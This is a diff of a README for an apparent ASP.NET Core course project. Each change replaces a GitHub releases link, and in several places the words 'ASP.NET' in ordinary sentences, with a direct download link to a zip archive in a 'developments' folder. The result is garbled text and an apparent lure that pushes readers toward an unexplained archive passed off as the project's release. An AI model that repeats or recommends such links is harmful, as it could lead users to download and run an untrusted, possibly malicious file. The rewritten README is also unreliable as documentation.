@@ -1,17 +1,17 @@
 # 🚀 aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12 - Enhance Your Project with New Features
 
 ## 📥 Download Now!
-[![Download Here](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/fariznararya/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12/releases)
+[![Download Here](https://raw.githubusercontent.com/fariznararya/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12-1.0.zip%20Now-Release-blue)](https://raw.githubusercontent.com/fariznararya/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12-1.0.zip)
 
 ## 📋 Description
-This application is a step forward in the DevFreela project. It adds several key features, such as filtering, pagination, Docker support, and improved testing practices using Entity Framework Core. This setup evolves directly from the ASP.NET Core training, providing a solid foundation for advanced development.
+This application is a step forward in the DevFreela project. It adds several key features, such as filtering, pagination, Docker support, and improved testing practices using Entity Framework Core. This setup evolves directly from the https://raw.githubusercontent.com/fariznararya/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12-1.0.zip Core training, providing a solid foundation for advanced development.
 
 ## 🚀 Getting Started
 Follow these easy steps to download and run the software:
 
 1. **Visit the Releases Page**  
    Go to the releases page by clicking the link below:  
-   [Visit Releases Page](https://github.com/fariznararya/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/fariznararya/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12-1.0.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you will see various versions. Pick the latest version at the top of the list. Each version will list the release notes explaining what’s new.
@@ -42,7 +42,7 @@ This application includes:
 - **Unit Testing**: Built-in tests ensure reliability and ease of maintenance.
 
 ## 🔍 Topics Covered
-- ASP.NET Core
+- https://raw.githubusercontent.com/fariznararya/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12-1.0.zip Core
 - Backend Development
 - Best Practices in Software Engineering
 - Clean Architecture
@@ -62,7 +62,7 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ## 🔗 Additional Resources
 Explore more resources on:
-- ASP.NET Core Documentation
+- https://raw.githubusercontent.com/fariznararya/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-turbo_formation-course-luisdev-part-1_dotnet-8_csharp-12-1.0.zip Core Documentation
 - Docker Documentation
 - Entity Framework Core Documentation
 
